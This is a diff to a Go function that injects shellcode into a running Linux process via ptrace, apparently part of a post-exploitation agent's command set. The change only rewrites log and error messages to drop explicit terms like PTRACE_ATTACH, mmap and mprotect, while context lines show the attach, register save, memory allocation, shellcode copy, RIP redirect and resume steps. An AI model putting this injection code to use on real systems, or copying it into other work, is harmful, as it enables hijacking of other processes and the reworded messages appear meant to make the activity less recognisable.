@@ -70,14 +70,14 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
-	sb.WriteString(fmt.Sprintf("[*] PTRACE_ATTACH to PID %d...\n", args.PID))
+	sb.WriteString(fmt.Sprintf("[*] Attaching to PID %d...\n", args.PID))
 	if err := syscall.PtraceAttach(args.PID); err != nil {
 		hint := ""
 		if err == syscall.EPERM {
 			hint = "\n[*] Hint: check /proc/sys/kernel/yama/ptrace_scope (0=permissive, 1=parent-only). " +
 				"Requires scope=0, CAP_SYS_PTRACE, or running as root."
 		}
-		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_ATTACH failed: %v%s\n", err, hint))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Attach failed: %v%s\n", err, hint))
 	}
 
 	var ws syscall.WaitStatus
@@ -90,7 +90,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	var origRegs syscall.PtraceRegs
 	if err := syscall.PtraceGetRegs(args.PID, &origRegs); err != nil {
 		_ = syscall.PtraceDetach(args.PID)
-		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_GETREGS failed: %v\n", err))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Register read failed: %v\n", err))
 	}
 	sb.WriteString(fmt.Sprintf("[+] Saved registers (RIP=0x%X, RSP=0x%X)\n", origRegs.Rip, origRegs.Rsp))
 
@@ -114,14 +114,14 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	if err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
-		return errorResult(sb.String() + fmt.Sprintf("[!] mmap syscall failed: %v\n", err))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Memory allocation failed: %v\n", err))
 	}
 	if rwAddr >= 0xfffffffffffff000 {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
-		return errorResult(sb.String() + fmt.Sprintf("[!] mmap returned MAP_FAILED (0x%X)\n", rwAddr))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Memory allocation returned error (0x%X)\n", rwAddr))
 	}
-	sb.WriteString(fmt.Sprintf("[+] mmap allocated RW page at 0x%X (%d bytes)\n", rwAddr, pageSize))
+	sb.WriteString(fmt.Sprintf("[+] Allocated writable memory at 0x%X (%d bytes)\n", rwAddr, pageSize))
 
 	injectionCode := make([]byte, len(shellcode))
 	copy(injectionCode, shellcode)
@@ -140,7 +140,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	if err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
-		return errorResult(sb.String() + fmt.Sprintf("[!] mprotect syscall failed: %v\n", err))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Protection change failed: %v\n", err))
 	}
 	ptraceMprotectCheck(mprotectRet, &sb)
 
@@ -150,7 +150,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	if err := syscall.PtraceSetRegs(args.PID, &newRegs); err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
-		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_SETREGS failed: %v\n", err))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Register write failed: %v\n", err))
 	}
 	sb.WriteString(fmt.Sprintf("[+] Set RIP to 0x%X\n", rwAddr))
 
@@ -158,7 +158,7 @@ func ptraceInject(args ptraceInjectArgs) structs.CommandResult {
 	if err := syscall.PtraceCont(args.PID, 0); err != nil {
 		_ = syscall.PtraceSetRegs(args.PID, &origRegs)
 		_ = syscall.PtraceDetach(args.PID)
-		return errorResult(sb.String() + fmt.Sprintf("[!] PTRACE_CONT failed: %v\n", err))
+		return errorResult(sb.String() + fmt.Sprintf("[!] Continue failed: %v\n", err))
 	}
 
 	if restore {
